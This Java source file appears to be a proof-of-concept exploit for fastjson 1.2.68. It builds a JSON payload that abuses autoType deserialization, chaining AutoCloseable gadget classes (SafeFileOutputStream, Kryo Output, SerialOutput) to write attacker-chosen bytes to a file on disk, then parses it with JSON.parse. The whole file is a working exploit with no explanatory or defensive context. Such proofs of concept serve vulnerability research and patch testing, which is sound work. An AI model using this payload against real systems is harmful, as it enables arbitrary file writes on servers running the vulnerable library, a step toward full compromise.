package com.firebasky.fastjson.poc1268;

import com.alibaba.fastjson.JSON;

public class write_2 {
    public static void main(String[] args) {
        String poc ="{\n" +
                "    \"stream\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "        \"targetPath\": \"d:/pwn.txt\",\n" +
                "        \"tempPath\": \"\"\n" +
                "    },\n" +
                "    \"writer\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
                "        \"buffer\": \"YjF1M3I=\",\n" +
                "        \"outputStream\": {\n" +
                "            \"$ref\": \"$.stream\"\n" +
                "        },\n" +
                "        \"position\": 5\n" +
                "    },\n" +
                "    \"close\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
                "        \"out\": {\n" +
                "            \"$ref\": \"$.writer\"\n" +
                "        }\n" +
                "    }\n" +
                "}";
        Object parse = JSON.parse(poc);
        System.out.println(parse);
    }
}
